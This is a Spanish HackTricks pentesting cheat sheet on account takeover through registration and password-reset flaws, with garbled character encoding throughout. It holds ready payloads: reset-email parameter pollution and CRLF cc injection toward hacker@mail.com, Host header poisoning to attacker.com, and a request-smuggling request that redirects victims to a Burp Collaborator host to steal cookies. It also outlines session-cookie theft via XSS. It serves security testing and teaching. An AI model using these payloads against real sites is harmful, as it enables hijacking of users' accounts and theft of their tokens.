# Vulnerabilidades de Registro y Toma de Control

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Toma de Control de Registro

### Registro Duplicado

* Intenta generar un usuario existente
* Verifica variando el correo electrÃ³nico:
  * mayÃºsculas
  * \+1@
  * agrega algo en el correo electrÃ³nico
  * caracteres especiales en el nombre del correo electrÃ³nico (%00, %09, %20)
  * Pon caracteres negros despuÃ©s del correo electrÃ³nico: `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### EnumeraciÃ³n de Usuario

Verifica si puedes averiguar cuÃ¡ndo se ha registrado un usuario dentro de la aplicaciÃ³n.

### PolÃ­tica de ContraseÃ±a

Al crear un usuario, verifica la polÃ­tica de contraseÃ±as (verifica si se pueden usar contraseÃ±as dÃ©biles).\
En ese caso, puedes intentar fuerza bruta de credenciales.

### InyecciÃ³n SQL

[**Verifica esta pÃ¡gina**](sql-injection/#insert-statement) para aprender cÃ³mo intentar tomar el control de cuentas o extraer informaciÃ³n a travÃ©s de **Inyecciones SQL** en formularios de registro.

### Toma de Control de Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vulnerabilidades de SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Cambio de Correo ElectrÃ³nico

Cuando te registras, intenta cambiar el correo electrÃ³nico y verifica si este cambio se valida correctamente o si se puede cambiar a correos electrÃ³nicos arbitrarios.

### MÃ¡s Verificaciones

* Verifica si puedes usar **correos electrÃ³nicos desechables**
* ContraseÃ±a **larga** (>200) conduce a **DoS**
* **Verifica los lÃ­mites de velocidad en la creaciÃ³n de cuentas**
* Usa username@**burp\_collab**.net y analiza el **callback**

## **Toma de Control de Restablecimiento de ContraseÃ±a**

### Fuga de Token de Restablecimiento de ContraseÃ±a a travÃ©s del Referente <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Solicita el restablecimiento de contraseÃ±a a tu direcciÃ³n de correo electrÃ³nico
2. Haz clic en el enlace de restablecimiento de contraseÃ±a
3. No cambies la contraseÃ±a
4. Haz clic en cualquier sitio web de terceros (por ejemplo: Facebook, Twitter)
5. Intercepta la solicitud en el proxy de Burp Suite
6. Verifica si el encabezado de referencia estÃ¡ filtrando el token de restablecimiento de contraseÃ±a.

### Envenenamiento de Restablecimiento de ContraseÃ±a <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercepta la solicitud de restablecimiento de contraseÃ±a en Burp Suite
2. Agrega o edita los siguientes encabezados en Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. ReenvÃ­a la solicitud con el encabezado modificado\
   `http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Busca una URL de restablecimiento de contraseÃ±a basada en el _encabezado de host_ como: `https://attacker.com/reset-password.php?token=TOKEN`

### Restablecimiento de ContraseÃ±a a travÃ©s del ParÃ¡metro de Correo ElectrÃ³nico <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR en ParÃ¡metros de API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. El atacante debe iniciar sesiÃ³n con su cuenta y acceder a la funciÃ³n de **Cambio de contraseÃ±a**.
2. Inicie Burp Suite e intercepte la solicitud.
3. EnvÃ­ela a la pestaÃ±a de repeticiÃ³n y edite los parÃ¡metros: ID de usuario/correo electrÃ³nico\
   `powershell POST /api/changepass [...] ("form": {"email":"victima@correo.com","password":"contraseÃ±asegura"})`

### Token de Restablecimiento de ContraseÃ±a DÃ©bil <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

El token de restablecimiento de contraseÃ±a debe generarse aleatoriamente y ser Ãºnico cada vez.\
Trate de determinar si el token expira o si siempre es el mismo, en algunos casos el algoritmo de generaciÃ³n es dÃ©bil y puede ser adivinado. Las siguientes variables pueden ser utilizadas por el algoritmo.

* Marca de tiempo
* ID de usuario
* Correo electrÃ³nico del usuario
* Nombre y apellido
* Fecha de nacimiento
* CriptografÃ­a
* Solo nÃºmeros
* Secuencia de token pequeÃ±a (caracteres entre \[A-Z,a-z,0-9])
* ReutilizaciÃ³n de token
* Fecha de vencimiento del token

### Fuga de Token de Restablecimiento de ContraseÃ±a <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Desencadene una solicitud de restablecimiento de contraseÃ±a utilizando la API/UI para un correo electrÃ³nico especÃ­fico, por ejemplo: test@correo.com
2. Inspeccione la respuesta del servidor y busque `resetToken`
3. Luego use el token en una URL como `https://ejemplo.com/v3/user/password/reset?resetToken=[EL_TOKEN_DE_RESTABLECIMIENTO]&email=[EL_CORREO]`

### Restablecimiento de ContraseÃ±a a travÃ©s de ColisiÃ³n de Nombre de Usuario <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. RegÃ­strese en el sistema con un nombre de usuario idÃ©ntico al nombre de usuario de la vÃ­ctima, pero con espacios en blanco insertados antes y/o despuÃ©s del nombre de usuario. por ejemplo: `"admin "`
2. Solicite un restablecimiento de contraseÃ±a con su nombre de usuario malicioso.
3. Use el token enviado a su correo electrÃ³nico y restablezca la contraseÃ±a de la vÃ­ctima.
4. ConÃ©ctese a la cuenta de la vÃ­ctima con la nueva contraseÃ±a.

La plataforma CTFd era vulnerable a este ataque.\
Ver: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Toma de Control de Cuenta a travÃ©s de Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encuentre un XSS dentro de la aplicaciÃ³n o un subdominio si las cookies estÃ¡n limitadas al dominio principal: `*.dominio.com`
2. Filtrar la **cookie de sesiÃ³n** actual
3. Autenticarse como el usuario utilizando la cookie

### Toma de Control de Cuenta a travÃ©s de HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Use **smuggler** para detectar el tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Cree una solicitud que sobrescriba el `POST / HTTP/1.1` con los siguientes datos:\
`GET http://algo.burpcollaborator.net HTTP/1.1 X:` con el objetivo de redirigir a las vÃ­ctimas a burpcollab y robar sus cookies\
3\. La solicitud final podrÃ­a verse asÃ­
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Reportes de Hackerone que explotan este error\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Toma de cuenta a travÃ©s de CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Cree un payload para CSRF, por ejemplo: "formulario HTML con envÃ­o automÃ¡tico para cambio de contraseÃ±a"
2. EnvÃ­e el payload

### Toma de cuenta a travÃ©s de JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

El token web JSON podrÃ­a ser utilizado para autenticar a un usuario.

* Edite el JWT con otro ID de usuario / correo electrÃ³nico
* Verifique la firma JWT dÃ©bil

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Referencias

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
